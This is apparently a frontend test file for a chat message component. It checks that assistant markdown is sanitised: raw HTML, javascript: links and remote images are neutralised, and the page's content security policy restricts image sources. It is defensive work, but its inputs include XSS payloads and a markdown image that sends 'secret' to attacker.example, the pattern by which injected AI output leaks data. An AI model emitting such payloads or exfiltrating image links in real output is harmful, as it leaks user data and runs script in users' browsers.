import { render, screen } from "@testing-library/react";
import { expect, it, vi } from "vitest";

vi.mock("@/lib/uploads", () => ({ uploadContentUrl: (id: string) => `/api/uploads/${id}/content` }));

import { MessageBubble } from "@/components/chat/message-bubble";
import indexHtml from "../../../index.html?raw";

it("drops raw html from assistant markdown", () => {
	const { container } = render(<MessageBubble role="assistant" content={'before <img src="x" onerror="alert(1)"> <script>alert(2)</script> after'} />);
	expect(container.querySelector("img")).toBeNull();
	expect(container.querySelector("script")).toBeNull();
	expect(container.querySelector("[onerror]")).toBeNull();
});

it("neutralizes javascript links in assistant markdown", () => {
	render(<MessageBubble role="assistant" content="[run me](javascript:alert(1))" />);
	const link = screen.getByText("run me").closest("a");
	expect(link?.getAttribute("href") ?? "").not.toMatch(/^\s*javascript:/i);
});

it("renders model images as inert text instead of fetching them", () => {
	const { container } = render(
		<MessageBubble role="assistant" content={"![s](https://attacker.example/c?d=secret)\n\n![r][ref]\n\n[ref]: //attacker.example/p.png"} />
	);
	expect(container.querySelector("img")).toBeNull();
	expect(document.head.querySelector('link[rel="preload"][as="image"]')).toBeNull();
	expect(container.textContent).toContain("https://attacker.example/c?d=secret");
	expect(container.textContent).toContain("[image: s]");
});

it("opens model links in a new tab without a referrer", () => {
	render(<MessageBubble role="assistant" content="[docs](https://example.com/page)" />);
	const link = screen.getByRole("link", { name: "docs" });
	expect(link).toHaveAttribute("target", "_blank");
	expect(link).toHaveAttribute("rel", "noopener noreferrer nofollow");
});

it("lets the page load images only from its own origin", () => {
	const imgSrc = /img-src([^;]*);/.exec(indexHtml)?.[1]?.trim().split(/\s+/);
	expect(imgSrc).toEqual(["'self'", "data:", "blob:"]);
});
